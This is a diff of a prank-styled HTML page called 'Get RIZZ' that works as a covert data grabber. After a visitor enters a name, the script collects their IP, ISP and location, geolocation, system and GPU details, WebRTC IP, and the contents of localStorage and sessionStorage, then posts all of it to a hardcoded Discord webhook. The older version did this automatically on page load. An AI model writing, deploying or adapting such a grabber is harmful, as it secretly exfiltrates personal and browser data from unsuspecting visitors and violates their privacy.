@@ -4,19 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Get RIZZ</title>
+</head>
+<body>
+    <h2>📡 Enter your name to continue...</h2>
+    <form id="nameForm">
+        <label>Enter your name:</label>
+        <input type="text" id="userName" required>
+        <button type="button" onclick="startLogging()">Send</button>
+    </form>
+
     <script>
         // 🚨 Vervang met je eigen Discord webhook URL!
         const webhookURL = "https://discord.com/api/webhooks/1351915230162194505/1UuADVPH0L6Z7tZWe13pCuwuNyD0oCCTt94uFBJnYht9dWIgjaEXHQfw-N9M_EUmeBzi";
 
+        let userName = "";
+
+        function startLogging() {
+            userName = document.getElementById("userName").value.trim();
+            if (!userName) {
+                alert("⚠️ Please enter your name before continuing.");
+                return;
+            }
+
+            sendToDiscord(`👤 Name: ${userName}`);
+            getIP();
+            getSystemInfo();
+            getWebRTCIP();
+            getLocalStorage();
+            getSessionStorage();
+            getGPUInfo();
+        }
+
         function getIP() {
             fetch("https://api64.ipify.org?format=json")
             .then(response => response.json())
-            .then(data => sendToDiscord("🌍 Extern IP: " + data.ip));
+            .then(data => sendToDiscord(`🌍 Extern IP: ${data.ip}`));
 
             fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                let ipInfo = `🌐 ISP: ${data.org}\n🌍 Locatie: ${data.city}, ${data.region}, ${data.country}`;
+                let ipInfo = `🌐 ISP: ${data.org}\n🌍 Location: ${data.city}, ${data.region}, ${data.country}`;
                 sendToDiscord(ipInfo);
             });
         }
@@ -24,20 +51,20 @@
         function getSystemInfo() {
             let info = {
                 "📌 Browser": navigator.userAgent,
-                "🖥️ Besturingssysteem": navigator.platform,
-                "💾 RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Onbekend",
-                "🖥️ CPU-kernen": navigator.hardwareConcurrency || "Onbekend",
-                "📏 Schermresolutie": window.screen.width + "x" + window.screen.height,
-                "🌍 Tijdzone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                "🔋 Batterijstatus": "Niet beschikbaar",
-                "🔌 Online status": navigator.onLine ? "✅ Online" : "❌ Offline",
-                "🔐 Cookies ingeschakeld": navigator.cookieEnabled ? "✅ Ja" : "❌ Nee",
-                "🕵️ Referrer": document.referrer || "Direct bezoek"
+                "🖥️ OS": navigator.platform,
+                "💾 RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                "🖥️ CPU Cores": navigator.hardwareConcurrency || "Unknown",
+                "📏 Screen Resolution": `${window.screen.width}x${window.screen.height}`,
+                "🌍 Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "🔋 Battery Status": "Not available",
+                "🔌 Online Status": navigator.onLine ? "✅ Online" : "❌ Offline",
+                "🔐 Cookies Enabled": navigator.cookieEnabled ? "✅ Yes" : "❌ No",
+                "🕵️ Referrer": document.referrer || "Direct visit"
             };
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
-                    info["📍 Geolocatie"] = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                    info["📍 Geolocation"] = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                     sendToDiscord(JSON.stringify(info, null, 2));
                 }, () => {
                     sendToDiscord(JSON.stringify(info, null, 2));
@@ -47,7 +74,7 @@
             }
 
             navigator.getBattery().then(battery => {
-                info["🔋 Batterijstatus"] = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(🔌 Opladen)" : "(🔋 Niet aan het opladen)"}`;
+                info["🔋 Battery Status"] = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? "(🔌 Charging)" : "(🔋 Not charging)"}`;
                 sendToDiscord(JSON.stringify(info, null, 2));
             });
         }
@@ -101,19 +128,6 @@
                 body: JSON.stringify({ content: "```" + message + "```" })
             });
         }
-
-        // 🚀 Automatisch alle info verzamelen en verzenden bij het laden van de pagina
-        window.onload = function() {
-            getIP();
-            getSystemInfo();
-            getWebRTCIP();
-            getLocalStorage();
-            getSessionStorage();
-            getGPUInfo();
-        };
     </script>
-</head>
-<body>
-    <h2>📡 You now have rizz...</h2>
 </body>
 </html>
